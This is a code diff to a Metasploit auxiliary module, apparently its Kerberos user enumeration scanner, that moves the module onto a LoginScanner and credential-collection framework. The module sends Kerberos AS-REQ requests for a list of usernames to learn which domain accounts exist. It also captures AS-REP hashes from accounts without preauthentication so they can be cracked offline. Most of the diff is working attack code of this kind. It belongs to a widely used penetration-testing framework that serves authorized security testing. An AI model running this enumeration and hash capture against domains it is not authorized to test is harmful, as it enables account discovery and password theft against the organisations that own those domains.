@@ -3,9 +3,14 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'metasploit/framework/credential_collection'
+require 'metasploit/framework/login_scanner/kerberos'
+
 class MetasploitModule < Msf::Auxiliary
-  include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::Kerberos::Client
+  include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::Report
+  include Msf::Auxiliary::AuthBrute
 
   def initialize(info = {})
     super(
@@ -29,84 +34,66 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('DOMAIN', [ true, 'The Domain Eg: demo.local' ]),
-        OptPath.new(
-          'USER_FILE',
-          [true, 'Files containing usernames, one per line', nil]
-        )
-      ],
-      self.class
+        OptString.new('DOMAIN', [ true, 'The Domain Eg: demo.local' ])
+      ]
     )
-  end
 
-  def user_list
-    if File.readable? datastore['USER_FILE']
-      users = File.new(datastore['USER_FILE']).readlines(chomp: true)
-      users.each(&:downcase!)
-      users.uniq!
-    else
-      raise ArgumentError, "Cannot read file #{datastore['USER_FILE']}"
-    end
-    users
+    deregister_options('BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'DB_ALL_CREDS', 'DB_ALL_PASS', 'PASSWORD', 'PASS_FILE', 'USER_AS_PASS', 'USERPASS_FILE')
   end
 
   def run
     domain = datastore['DOMAIN'].upcase
     print_status("Using domain: #{domain} - #{peer}...")
 
-    pre_auth = []
-    pre_auth << build_pa_pac_request
-    pre_auth
+    cred_collection = build_credential_collection({ usernames_only: true })
+    pre_auth = [build_pa_pac_request]
+    scanner = ::Metasploit::Framework::LoginScanner::Kerberos.new(
+      host: self.rhost,
+      port: self.rport,
+      server_name: "krbtgt/#{domain}",
+      realm: domain.to_s,
+      pa_data: pre_auth,
+      cred_details: cred_collection,
+      datastore: datastore
+    )
 
-    user_list.each do |user|
-      next if user.empty?
+    scanner.scan! do |result|
+      credential_data = result.to_h
 
-      begin
-        res = send_request_as(
-          client_name: user.to_s,
-          server_name: "krbtgt/#{domain}",
-          realm: domain.to_s,
-          pa_data: pre_auth
-        )
-      rescue ::EOFError => e
-        print_error("#{peer} - User: #{user.inspect} - EOF Error #{e.message}. Aborting...")
-        elog(e)
-        # Stop further requests entirely
-        return false
-      rescue Rex::Proto::Kerberos::Model::Error::KerberosDecodingError => e
-        print_error("#{peer} - User: #{user.inspect} - Decoding Error -  #{e.message}. Aborting...")
-        elog(e)
-        # Stop further requests entirely
-        return false
-      end
-
-      case res.msg_type
-      when Rex::Proto::Kerberos::Model::AS_REP
-        hash = format_asrep_to_john_hash(res)
-
-        # Accounts that have 'Do not require Kerberos preauthentication' enabled, will receive an ASREP response with a ticket present
-        print_good("#{peer} - User: #{user.inspect} does not require preauthentication. Hash: #{hash}")
+      case credential_data[:status]
+      when :eof
+        print_error("#{self.rhost} - User: #{credential_data[:username]} - EOF Error #{credential_data[:proof]}. Aborting...")
+        # Abort
+        break
+      when :decode_error
+        print_error("#{self.rhost} - User: #{credential_data[:username]} - Decoding Error -  #{credential_data[:proof]}. Aborting...")
+        # Abort
+        break
+      when :wrong_realm
+        print_error("#{self.rhost} - User: #{credential_data[:username]} - #{credential_data[:proof]}. Domain option may be incorrect. Aborting...")
+        # Abort
+        break
+      when :no_preauth
+        print_good("#{self.rhost} - User: #{credential_data[:username]} does not require preauthentication. Hash: #{credential_data[:hash]}")
         report_cred(
-          user: user,
-          asrep: hash
+          user: credential_data[:username],
+          asrep: credential_data[:hash]
         )
-      when Rex::Proto::Kerberos::Model::KRB_ERROR
-        if res.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_PREAUTH_REQUIRED
-          print_good("#{peer} - User: #{user.inspect} is present")
-          report_cred(user: user)
-        elsif res.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_CLIENT_REVOKED
-          print_error("#{peer} - User: #{user.inspect} account disabled or locked out")
-        elsif res.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_C_PRINCIPAL_UNKNOWN
-          vprint_status("#{peer} - User: #{user.inspect} user not found")
-        elsif res.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_WRONG_REALM
-          print_error("#{peer} - User: #{user.inspect} - #{res.error_code}. Domain option may be incorrect. Aborting...")
-          # Stop further requests entirely
-          return false
-        else
-          vprint_status("#{peer} - User: #{user.inspect} - #{res.error_code}")
-        end
+        break if datastore['STOP_ON_SUCCESS']
+      when :present
+        print_good("#{self.rhost} - User: #{credential_data[:username]} is present")
+        report_cred(user: credential_data[:username])
+        break if datastore['STOP_ON_SUCCESS']
+      when :disabled_or_locked_out
+        print_error("#{self.rhost} - User: #{credential_data[:username]} account disabled or locked out")
+      when :not_found
+        vprint_status("#{self.rhost} - User: #{credential_data[:username]} user not found")
+      when :unknown_error
+        vprint_status("#{self.rhost} - User: #{credential_data[:username]} - #{credential_data[:error_code]}")
+      when :unknown_response
+        vprint_status("#{self.rhost} - User: #{credential_data[:username]} - #{credential_data[:proof][:error_code]}. Unknown response #{credential_data[:proof][:repsonse]}")
       else
-        vprint_status("#{peer} - User: #{user.inspect} - #{res.error_code}. Unknown response #{res.msg_type.inspect}")
+        print_error("#{self.rhost} - User: #{credential_data[:username]}. Unknown return status: #{credential_data[:status]}")
       end
     end
   end
@@ -144,11 +131,5 @@ class MetasploitModule < Msf::Auxiliary
     }.merge(service_data)
 
     create_credential_login(login_data)
-  end
-
-  # @param [Rex::Proto::Kerberos::Model::KdcResponse] asrep The krb5 asrep response
-  # @return [String] A valid string format which can be cracked offline
-  def format_asrep_to_john_hash(asrep)
-    "$krb5asrep$#{asrep.enc_part.etype}$#{asrep.cname.name_string.join('/')}@#{asrep.ticket.realm}:#{asrep.enc_part.cipher[0...16].unpack1('H*')}$#{asrep.enc_part.cipher[16..].unpack1('H*')}"
   end
 end
